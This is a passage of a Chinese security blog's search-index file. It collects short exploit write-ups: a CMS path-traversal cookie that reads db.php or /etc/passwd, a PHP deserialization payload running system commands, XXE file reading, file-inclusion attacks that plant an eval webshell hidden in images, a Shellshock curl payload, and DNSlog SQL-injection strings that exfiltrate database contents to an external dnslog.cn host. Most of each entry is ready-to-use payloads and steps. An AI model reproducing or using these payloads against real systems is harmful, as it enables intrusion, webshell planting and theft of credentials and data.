<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Connection:</span> keep-alive<span class="token header-name keyword">Cookie:</span> members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencodedajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会返回如下数据</p><p><img src="https://i.loli.net/2019/10/21/NPhFWOcK6wd3TQA.png"></p><p> 在/data/upload/avatar/年月/日文件夹下 会生成一张图片</p><p><img src="https://i.loli.net/2019/10/21/NitTmDKRWvFMUJ6.png"></p><p>这张图片的名称由id和时间戳的md5值构成，我们可以将Burp Suite上返回的时间转换为时间戳</p><p><img src="https://i.loli.net/2019/10/21/aBcimVp8erndODU.png"></p><p>不过这个时间可能会有误差，如果不行就把时间+-10</p><p>我post的id为654321，获取的时间戳为1571659588，将他们连在一起进行md5加密</p><p><img src="https://i.loli.net/2019/10/21/WuoP3xDBIOgrHQE.png"></p><p>成功获取图片名，然后访问 10.1.1.1/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg ，保存该图片用文本打开就是 db.php 的内容。</p><h6 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h6><p>在没有Burp Suite的情况下可以直接使用<a href="http://coolaf.com/">在线POST</a>，参数如下</p><p><img src="https://i.loli.net/2019/10/22/rQOT4Nw5ZIgC3o2.png"></p><p>在Header可获取到时间戳</p><p><img src="https://i.loli.net/2019/10/22/Htl8Le2sYUIT9Nx.png"></p><h2 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="可能会遇到的问题"></a>可能会遇到的问题</h2><h6 id="post数据返回unicode编码"><a href="#post数据返回unicode编码" class="headerlink" title="post数据返回unicode编码"></a>post数据返回unicode编码</h6><p>因为名称，密码，ID等内容格式不对或重复会出现这种情况，将unicode编码进行解码，按提示修改即可。</p><h6 id="读取其他文件"><a href="#读取其他文件" class="headerlink" title="读取其他文件"></a>读取其他文件</h6><p>../../../../Application/Common/Conf/db.php</p><p>是读取db.php，如果想读取根目录可以构造</p><p>../../../../../../../../etc/passwd</p><h6 id="时间戳问题"><a href="#时间戳问题" class="headerlink" title="时间戳问题"></a>时间戳问题</h6><p>服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的PHP反序列化</title>
      <link href="/archives/f8e3d21b/"/>
      <url>/archives/f8e3d21b/</url>
      
        <content type="html"><![CDATA[<h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$xcx</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$miku</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">xcx</span><span class="token punctuation">;</span>       <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">miku</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'qq'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码上的 function __destruct是析构函数，会在 销毁一个类之前执行的一些操作或完成一些功能 。</p><p>因上面将xcx赋值给a，再将miku放进a执行，可以根据这个构造出命令执行的序列化</p><h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$xcx</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$miku</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">xcx</span><span class="token punctuation">;</span>       <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">miku</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将输出的值以POST形式传参，会返回whoami的结果</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML外部实体注入(XXE)</title>
      <link href="/archives/81510889/"/>
      <url>/archives/81510889/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.</p><p>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果构造特殊的实体就可以做到任意文件读取。</p><p>想了解XXE可以去看先知社区的这篇文章<a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a>。</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>抓包某登录框，发现是使用XML传输切会回显登录用户名</p><p><img src="https://i.loli.net/2019/10/28/XuiFc5BDROknwpe.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>构建外部实体读取etc/passwd成功</p><p><img src="https://i.loli.net/2019/10/28/6bYKjNZfDOJ4L5P.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>凡诺CMS文件包含漏洞</title>
      <link href="/archives/b0c3a4a4/"/>
      <url>/archives/b0c3a4a4/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/10/28/BZEiyAfn6vCF8OD.png" alt="文件包含8.png"></p><p>在后台添加频道处可以上传图片和附件，可以上传图片或上传以下格式的附件</p><p><img src="https://i.loli.net/2019/10/28/N2Vy1WZzpvDERY7.png"></p><p>图片马的制作在上篇<a href="https://xcxmiku.github.io/2019/10/15/LFI%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文章</a>说过，这里我将冰蝎马改名为shell.doc进行上传，上传后会回显文件地址。</p><p><img src="https://i.loli.net/2019/10/28/jDT5OdbHMoIPure.png"></p><p>然后将回显的文件地址填在频道模板处，在地址前面加上../../（用于跳出文件目录）</p><p><img src="https://i.loli.net/2019/10/28/BlRUQC8MEidTwaJ.png"></p><p>设置频道名称后添加频道，在首页找到添加的频道打开</p><p><img src="https://i.loli.net/2019/10/28/R4uBDmyFlXGCVns.png"></p><p>页面并没有显示任何东西，因为被当成PHP解析了。</p><p>使用冰蝎连接即可getshell！</p><p><img src="https://i.loli.net/2019/10/28/fqK3x4MarVvlo6Z.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LFI本地文件包含</title>
      <link href="/archives/2eda3969/"/>
      <url>/archives/2eda3969/</url>
      
        <content type="html"><![CDATA[<p><strong>LFI(Local File Inclusion)</strong><br>本地文件包含漏洞，指的是服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，利用这个特性，配合文件上传就可以getshell。</p><p>已知服务器存在文件包含且存在上传点</p><p><img src="https://i.loli.net/2019/10/28/PEFt7A4zhejvCrT.png"></p><p>只能上传图片，可制作图片一句话木马进行上传</p><p>在Windows可以通过cmd制作一句话木马。</p><p>命令为</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">copy 1.jpg&#x2F;b+2.php&#x2F;a 3.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数/b指定以二进制格式复制、合并文件。用于图像类/声音类文件</p><p>参数/a指定以ASCII格式复制、合并文件。用于txt等文档类文件</p><p>这条命令就是把j1.pg和2.php合并到一起，生成3.jpg</p><p>Linux/Macos下通过终端制作</p><p>命令为 </p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">cat 1.php &gt;&gt; 2.jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这句命令是将1.php追加到2.jpg里面</p><p>如果是两个文件合并生成第三个</p><p>命令为 </p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">cat 1.php 2.jpg &gt;&gt; 3.jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PHP一句话 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xcx'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/nbHKW8wAzc5efCg.png"></p><p>上传图片马</p><p><img src="https://i.loli.net/2019/10/28/OSp7EcsZQwvIG9V.png"></p><p>利用文件包含</p><p><img src="https://i.loli.net/2019/10/28/AsC3XSg48rGfWTF.png"></p><p>可看到图片被解析成了PHP（因为被解析了所以不会显示一句话木马）</p><p>使用蚁剑连接</p><p><img src="https://i.loli.net/2019/10/28/i9QhcJI3vAtoEsg.png"></p><p>成功getshell</p><p><img src="https://i.loli.net/2019/10/28/bdesIZP6pYgEzaG.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>破壳漏洞（CVE-2014-6271）</title>
      <link href="/archives/7dc46b66/"/>
      <url>/archives/7dc46b66/</url>
      
        <content type="html"><![CDATA[<p>linux下可以直接使用curl进行复现，命令如下 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -A <span class="token string">' () &#123; :;&#125;;echo ;  echo $(/bin/ls /);'</span> <span class="token string">'http://www.*****.com/cgi-bin/poc.cgi'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/cJipDq98KvAQ7LP.png"></p><p>Windows下可使用Burp Suite</p><p>将User-Agent改为() { :;};echo ;  echo $(/bin/ls /);</p><p><img src="https://i.loli.net/2019/10/28/4y8TzkoZWEH3Pe6.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次dnslog注入</title>
      <link href="/archives/9437e8fc/"/>
      <url>/archives/9437e8fc/</url>
      
        <content type="html"><![CDATA[<p>DNSlog辅助平台</p><p><a href="http://ceye.io/">http://ceye.io</a> 需注册</p><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a> 无需注册</p><h4 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www&#x2F;index.php?id&#x3D;1 and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.aksgyv.dnslog.cn\\abc&#39;))),0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www&#x2F;index.php?id&#x3D;1 and if((select load_file(concat(&#39;\\\\&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;dnslog&#39;),&#39;.aksgyv.dnslog.cn\\abc&#39;))),0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www&#x2F;index.php?id&#x3D;1 and if((select load_file(concat(&#39;\\\\&#39;,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;flag_is_here&#39;),&#39;.aksgyv.dnslog.cn\\abc&#39;))),0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.&#x2F;index.php?id&#x3D;1 and if((select load_file(concat(&#39;\\\\&#39;,(select flag from flag_is_here),&#39;.aksgyv.dnslog.cn\\abc&#39;))),0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
